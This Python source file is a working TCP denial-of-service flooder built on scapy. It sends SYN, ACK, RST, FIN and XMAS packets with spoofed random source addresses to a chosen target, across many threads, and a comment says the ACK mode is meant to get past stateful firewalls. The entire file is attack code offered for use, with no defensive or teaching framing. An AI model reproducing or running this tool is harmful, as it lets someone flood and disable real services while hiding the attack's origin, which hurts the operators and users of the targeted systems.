from scapy.all import IP, TCP, send
import random
import time
import threading
from core.colors import log_info, log_success, log_warning, log_danger

class Layer4TCP:
    def __init__(self, target_ip, target_port=80, threads=100, time=300):
        self.target_ip = target_ip
        self.target_port = target_port
        self.threads = threads
        self.time = time

    def generate_random_ip(self):
        return ".".join(str(random.randint(1, 254)) for _ in range(4))

    def syn_worker(self):
        end_time = time.time() + self.time
        while time.time() < end_time:
            try:
                # Spoof source IP and random source port
                src_ip = self.generate_random_ip()
                src_port = random.randint(1024, 65535)
                
                # Craft raw SYN packet
                ip_layer = IP(src=src_ip, dst=self.target_ip)
                tcp_layer = TCP(sport=src_port, dport=self.target_port, flags="S", seq=random.randint(1000, 9000), window=random.randint(1000, 9000))
                packet = ip_layer / tcp_layer
                
                send(packet, verbose=False)
            except Exception:
                pass

    def ack_worker(self):
        end_time = time.time() + self.time
        while time.time() < end_time:
            try:
                src_ip = self.generate_random_ip()
                src_port = random.randint(1024, 65535)
                
                # Craft raw ACK packet to bypass stateful firewalls
                ip_layer = IP(src=src_ip, dst=self.target_ip)
                tcp_layer = TCP(sport=src_port, dport=self.target_port, flags="A", seq=random.randint(1000, 9000), ack=random.randint(1000, 9000))
                packet = ip_layer / tcp_layer
                
                send(packet, verbose=False)
            except Exception:
                pass

    def rst_worker(self):
        end_time = time.time() + self.time
        while time.time() < end_time:
            try:
                src_ip = self.generate_random_ip()
                src_port = random.randint(1024, 65535)
                ip_layer = IP(src=src_ip, dst=self.target_ip)
                tcp_layer = TCP(sport=src_port, dport=self.target_port, flags="R", seq=random.randint(1000, 9000))
                packet = ip_layer / tcp_layer
                send(packet, verbose=False)
            except Exception:
                pass

    def fin_worker(self):
        end_time = time.time() + self.time
        while time.time() < end_time:
            try:
                src_ip = self.generate_random_ip()
                src_port = random.randint(1024, 65535)
                ip_layer = IP(src=src_ip, dst=self.target_ip)
                tcp_layer = TCP(sport=src_port, dport=self.target_port, flags="F", seq=random.randint(1000, 9000))
                packet = ip_layer / tcp_layer
                send(packet, verbose=False)
            except Exception:
                pass

    def xmas_worker(self):
        end_time = time.time() + self.time
        while time.time() < end_time:
            try:
                src_ip = self.generate_random_ip()
                src_port = random.randint(1024, 65535)
                ip_layer = IP(src=src_ip, dst=self.target_ip)
                # XMAS packet has FIN, PSH, and URG flags set
                tcp_layer = TCP(sport=src_port, dport=self.target_port, flags="FPU", seq=random.randint(1000, 9000))
                packet = ip_layer / tcp_layer
                send(packet, verbose=False)
            except Exception:
                pass

    def run_method(self, method="SYN"):
        log_info(f"Starting RAW {method} Flood on {self.target_ip}:{self.target_port} with {self.threads} threads...")
        threads = []
        target_func = None
        
        if method == "SYN": target_func = self.syn_worker
        elif method == "ACK": target_func = self.ack_worker
        elif method == "RST": target_func = self.rst_worker
        elif method == "FIN": target_func = self.fin_worker
        elif method == "XMAS": target_func = self.xmas_worker
        
        if target_func:
            for _ in range(self.threads):
                t = threading.Thread(target=target_func)
                t.start()
                threads.append(t)
            
            for t in threads:
                t.join()
            log_success(f"{method} Flood Finished.")
